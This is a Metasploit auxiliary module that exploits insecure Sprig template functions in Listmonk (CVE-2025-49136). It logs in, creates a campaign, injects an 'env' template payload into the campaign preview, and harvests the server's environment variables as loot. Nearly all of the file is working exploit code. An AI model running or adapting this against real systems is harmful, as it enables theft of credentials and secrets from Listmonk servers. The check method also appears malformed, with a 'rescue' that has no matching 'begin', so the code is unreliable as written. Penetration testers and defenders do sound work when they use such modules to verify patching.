##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Listmonk Insecure Sprig Template Functions Environment Disclosure',
        'Description' => %q{
          This module exploits insecure Sprig template functions in Listmonk
          versions prior to v5.0.2. The env and expandenv functions are enabled
          by default, allowing authenticated users with campaign permissions to
          extract sensitive environment variables via campaign preview.
        },
        'Author' => ['Tarek Nakkouch'],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-49136'],
          ['URL', 'https://github.com/knadh/listmonk/security/advisories/GHSA-jc7g-x28f-3v3h']
        ],
        'DisclosureDate' => '2025-06-08',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      Opt::RPORT(9000),
      OptString.new('TARGETURI', [true, 'Base path to Listmonk', '/']),
      OptString.new('USERNAME', [true, 'Listmonk username']),
      OptString.new('PASSWORD', [true, 'Listmonk password']),
      OptString.new('ENVVAR', [false, 'Specific environment variable to read']),
      OptPath.new('PAYLOAD_FILE', [false, 'Path to file containing template payload'])
    ])
  end

  def check
  
      login
    rescue Msf::Exploit::Failed => e
      return Msf::Exploit::CheckCode::Unknown("Authentication failed: #{e.message}")
    end

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'api', 'about'),
      'cookie' => @cookie
    })

    return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res

    if res.code == 200
      begin
        json = JSON.parse(res.body)
        if json['version']
          version_string = json['version'].gsub(/^v/, '')
          version = Rex::Version.new(version_string)
          if version < Rex::Version.new('5.0.2')
            return Msf::Exploit::CheckCode::Appears("Listmonk version #{version_string} is vulnerable")
          else
            return Msf::Exploit::CheckCode::Safe("Listmonk version #{version_string} is patched")
          end
        end
      rescue JSON::ParserError
        return Msf::Exploit::CheckCode::Unknown('Failed to parse version information')
      end
    end

    Msf::Exploit::CheckCode::Unknown('Could not determine if target is running Listmonk')
  end

  def get_nonce
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'admin', 'login')
    })

      fail_with(Failure::Unreachable, 'Connection failed') unless res

    nonce = res.body.match(/name="nonce"\s+value="([^"]+)"/)
      fail_with(Failure::UnexpectedReply, 'Could not extract nonce from login page') unless nonce

    @cookie = res.get_cookies

    nonce[1]
  end

  def login
    nonce = get_nonce

    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'admin', 'login'),
      'cookie' => @cookie,
      'vars_post' => {
        'nonce' => nonce,
        'next' => '/admin',
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    })

      fail_with(Failure::Unreachable, 'Connection failed during login') unless res
   

    if res.code == 302
      @cookie = res.get_cookies
      print_good('Login successful')
      return true
    else
      fail_with(Failure::NoAccess, "Login failed with code #{res.code}")
    end
  end

  def create_campaign
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'campaigns'),
      'cookie' => @cookie,
      'ctype' => 'application/json',
      'data' => {
        'archiveSlug' => 'tmp',
        'name' => 'tmp',
        'subject' => 'tmp',
        'lists' => [1],
        'from_email' => 'listmonk <noreply@listmonk.yoursite.com>',
        'content_type' => 'richtext',
        'messenger' => 'email',
        'type' => 'regular',
        'tags' => [],
        'send_at' => nil,
        'headers' => [],
        'media' => []
      }.to_json
    })

      fail_with(Failure::Unreachable, 'Connection failed during campaign creation') unless res

    if res.code == 200
      begin
        parsed = JSON.parse(res.body)
        campaign_id = parsed['data']['id']
        vprint_status("Campaign created with ID: #{campaign_id}")
        return campaign_id
      rescue JSON::ParserError
        fail_with(Failure::UnexpectedReply, 'Failed to parse campaign creation response')
      end
    else
      fail_with(Failure::Unknown, "Failed to create campaign: #{res.code}")
    end
  end

  def preview_campaign(campaign_id, payload)
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'api', 'campaigns', campaign_id.to_s, 'preview'),
      'cookie' => @cookie,
      'vars_post' => {
        'template_id' => '1',
        'content_type' => 'richtext',
        'body' => payload
      }
    })

      fail_with(Failure::Unreachable, 'Connection failed during preview') unless res

    fail_with(Failure::Unknown, "Preview failed with code: #{res.code}") unless res.code == 200
   extract_results(res.body)
    
  end

  def extract_results(html)
    paragraphs = html.scan(%r{<p[^>]*>(.*?)</p>}m).flatten

    if paragraphs.any?
      results = paragraphs.length > 1 ? paragraphs[0...-1] : paragraphs

      clean_results = []
      results.each do |p|
        clean_text = p.gsub(%r{</?[^>]*>}, '').strip
        next if clean_text.empty?

        clean_results << clean_text
      end

      if clean_results.any?
        print_good('Environment variable(s) extracted:')
        print_line('')
	clean_results.each do |result|
	  print_line(result.to_s)
	end


        loot_data = clean_results.join("\n")
        store_loot(
          'listmonk.env',
          'text/plain',
          rhost,
          loot_data,
          'listmonk_env_disclosure.txt',
          'Listmonk Environment Variables'
        )
        print_line('')
      end

      return clean_results
    else
      print_error('No results found in response')
      return []
    end
  end

  def run
    print_status("Targeting #{full_uri}")

    if datastore['PAYLOAD_FILE'] && File.exist?(datastore['PAYLOAD_FILE'])
      payload_content = File.read(datastore['PAYLOAD_FILE']).strip
      vprint_status("Using payload from file: #{datastore['PAYLOAD_FILE']}")
    elsif datastore['ENVVAR']
      payload_content = "{{ env \"#{datastore['ENVVAR']}\" }}"
      vprint_status("Reading environment variable: #{datastore['ENVVAR']}")
    else
      fail_with(Failure::BadConfig, 'Either ENVVAR or PAYLOAD_FILE must be specified')
    end

    payload = "<p>#{payload_content}</p>"

    login

    campaign_id = create_campaign

    print_status('Executing template to extract environment variables...')
    preview_campaign(campaign_id, payload)
  end
end
